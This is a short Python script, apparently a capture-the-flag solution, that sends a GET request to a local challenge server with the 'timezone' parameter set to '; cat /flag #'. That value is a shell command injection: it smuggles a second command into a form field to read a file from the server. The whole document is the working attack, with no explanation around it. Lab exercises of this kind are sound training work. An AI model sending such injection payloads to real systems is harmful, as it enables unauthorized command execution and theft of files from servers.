import requests

method = "GET"
site = "http://challenge.localhost"
port = 80

payload = "; cat /flag #"
params = {"timezone": payload}

url = f"{site}:{port}/"

response = requests.request(method, url, params=params)

print(f"\nResponse: {response.text}")
